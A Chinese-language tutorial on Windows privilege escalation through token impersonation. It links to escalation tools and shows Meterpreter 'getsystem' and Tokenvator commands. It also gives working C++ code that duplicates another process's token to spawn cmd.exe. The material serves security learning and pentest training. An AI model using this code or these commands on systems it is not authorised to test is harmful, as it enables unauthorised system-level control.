为了更好地理解和解决信息差的问题，我们需要借助外部资源来获取所需的信息。在没有上下文的情况下，我们很难理解某些术语和概念。以下是一些推荐的信息收集平台和步骤，帮助你更好地掌握相关知识。

### 1. 维基百科 (Wikipedia)
维基百科是一个很好的起点。例如，当你第一次接触到“token”、“system”等术语时，可以在维基百科中搜索这些术语。通过维基百科中的引用文章，你可以进一步深入了解相关概念。例如，输入“token”，你可能会被引导到Windows开发人员中心，了解“访问令牌”（access token）等相关内容。

### 2. Windows开发人员中心
这是另一个重要的信息来源。在这里，你可以找到关于函数、术语、结构体和枚举类型的详细文档。这对于理解底层代码非常有帮助。通过阅读这些资料，你可以逐步具备阅读高手写的攻略的能力，从而提升自己的技能。

### 3. GitHub
GitHub是一个开源代码库，可以找到许多实际项目和工具。这是一个学习和实践的好地方。例如，你可以找到与提权相关的工具和代码示例。

### 推荐参考资料
- **访问令牌**：[Microsoft 官方文档](https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-tokens)
- **从零开始内网渗透学习**：[GitHub 项目](https://github.com/l3m0n/pentest_study)

### 关键术语解释
- **Active Directory (AD)**：活动目录，用于集中管理网络中的用户和计算机。
- **krbtgt 账号**：域中的一个特殊账号，用于生成Kerberos票据。
- **通道代理**：一种用于网络通信的技术，常用于渗透测试中。
- **whoami /?**：命令行工具，用于显示当前用户的用户名。掌握每个命令的帮助手册是至关重要的。

### 提权工具
- **Tokenx_privEsc**：一个用于提权的工具，可以配合Metasploit使用。下载地址：[GitHub](https://github.com/sailay1996/tokenx_privEsc)
- **Tokenvator.exe**：另一个提权工具，下载地址：[GitHub](https://github.com/0xbadjuju/Tokenvator/releases)
- **incognito.exe**：用于身份伪装的工具。
- **getsystem.py**：Python脚本，用于提权。

### 使用Metasploit进行提权
如果你已经通过漏洞利用或其他方式进入了Meterpreter shell，可以直接运行`getsystem`命令来获取系统权限。具体步骤如下：
```bash
meterpreter > getsystem
```
等待一段时间后，你将获得系统权限。

### 其他提权方法
除了Metasploit的`getsystem`命令，还可以使用其他工具进行提权。例如：
```bash
C:\temp> Tokenvator.exe getsystem cmd.exe
```

### 示例代码
以下是一个简单的C++代码示例，用于获取进程的访问令牌并创建一个新的进程：

```cpp
#include <windows.h>
#include <iostream>
using namespace std;

HANDLE GetAccessToken(DWORD pid) {
    HANDLE currentProcess = {};
    HANDLE AccessToken = {};
    DWORD LastError;

    if (pid == 0) {
        return (HANDLE)NULL;
    } else {
        currentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!currentProcess) {
            LastError = GetLastError();
            wprintf(L"ERROR: OpenProcess(): %d\n", LastError);
            return (HANDLE)NULL;
        }
    }

    if (!OpenProcessToken(currentProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &AccessToken)) {
        LastError = GetLastError();
        wprintf(L"ERROR: OpenProcessToken(): %d\n", LastError);
        return (HANDLE)NULL;
    }

    return AccessToken;
}

int wmain(int argc, WCHAR **argv) {
    if (argc < 2) {
        wprintf(L"Usage: %ls <PID>\n", argv[0]);
        return 1;
    }

    DWORD pid = _wtoi(argv[1]);
    if ((pid == NULL) || (pid == 0)) {
        return 1;
    }
    wprintf(L"[+] Pid Chosen: %d\n", pid);

    HANDLE pToken = GetAccessToken(pid);
    if (pToken == NULL) {
        return 1;
    }

    SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
    TOKEN_TYPE tokenType = TokenPrimary;
    HANDLE pNewToken = {};

    if (!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &pNewToken)) {
        DWORD LastError = GetLastError();
        wprintf(L"ERROR: Could not duplicate process token [%d]\n", LastError);
        return 1;
    }

    wprintf(L"Process token has been duplicated.\n");

    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi = {};

    BOOL ret = CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    if (!ret) {
        DWORD lastError = GetLastError();
        wprintf(L"CreateProcessWithTokenW: %d\n", lastError);
        return 1;
    }

    return 0;
}
```

### 参考资料
- **渗透攻防工具篇-后渗透阶段的Meterpreter**：[Seebug Paper](https://paper.seebug.org/29/)
- **谷歌披露了影响所有Windows版本的20年未修补漏洞**：[The Hacker News](https://thehackernews.com/2019/08/ctfmon-windows-vulnerabilities.html)
- **交互式CTF探索工具**：[GitHub](https://github.com/taviso/ctftool)

通过以上步骤和资源，你可以更好地理解和解决提权相关的问题。